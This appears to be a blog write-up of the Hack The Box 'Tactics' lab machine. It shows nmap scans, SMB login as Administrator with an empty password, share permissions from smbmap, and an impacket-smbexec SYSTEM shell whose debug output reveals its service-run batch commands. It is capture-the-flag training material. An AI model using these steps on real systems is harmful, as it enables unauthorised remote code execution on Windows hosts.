---
layout: post
title: tactics
categories: htb
tags:
- htb
- starting_point
- tactics
- smbexec
author: nicoliboli
description: starting point | tier 1 | box 9
---

# enumeration

```
$ nmap -Pn 10.129.121.214
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 11:57 EDT
Nmap scan report for 10.129.121.214
Host is up (0.10s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 7.89 seconds

$ nmap -Pn -p- --min-rate=1000 10.129.121.214
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 11:57 EDT
Nmap scan report for 10.129.121.214
Host is up (0.10s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 129.41 seconds

$ nmap -Pn -sC -sV -p 135,139,445 10.129.121.214
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 11:58 EDT
Nmap scan report for 10.129.121.214
Host is up (0.11s latency).

PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-02T15:58:33
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.53 seconds
```

## port 445 - smb

had to try connecting a couple different ways before getting shares listed

```
$ smbclient -L 10.129.121.214             
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_ACCESS_DENIED

$ smbclient -U '' -p '' -L 10.129.121.214
Password for [WORKGROUP\]:
session setup failed: NT_STATUS_LOGON_FAILURE

$ smbclient -U 'Administrator' -p '' -L 10.129.121.214
Password for [WORKGROUP\Administrator]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.121.214 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

enumerate the shares to see what i can access

```
$ smbmap -u 'Administrator' -p '' -H 10.129.121.214
/usr/lib/python3/dist-packages/smbmap/smbmap.py:441: SyntaxWarning: invalid escape sequence '\p'
  stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % remoteName

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.121.214:445      Name: 10.129.121.214            Status: ADMIN!!!   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC
[*] Closed 1 connections
```

i used `smbexec` to connect to the box and was very nicely system. i set the `debug` flag because i was curious about what is going on under the hood of the tool. [this](https://rift.stacktitan.com/smbexec/) goes more in-depth about the artifacts and [this](https://rift.stacktitan.com/smbexec_part2/) tests some EDR evasion. the tl;dr is that `smbexec` works is that it creates a service (that can be specified with the `-service-name` flag, but defaults to `BTOBTO`) to run commands and deletes them 

```
$ impacket-smbexec -shell-type cmd -debug Administrator@10.129.121.214
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
Password:
[+] StringBinding ncacn_np:10.129.121.214[\pipe\svcctl]
[+] Executing %COMSPEC% /Q /c echo cd  ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\flWZtJvs.bat & %COMSPEC% /Q /c %SYSTEMROOT%\flWZtJvs.bat & del %SYSTEMROOT%\flWZtJvs.bat
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>ipconfig
[+] Executing %COMSPEC% /Q /c echo ipconfig ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\dImzvyCS.bat & %COMSPEC% /Q /c %SYSTEMROOT%\dImzvyCS.bat & del %SYSTEMROOT%\dImzvyCS.bat

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.121.214
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
```

![tactics_flag](/assets/img/tactics_flag.png)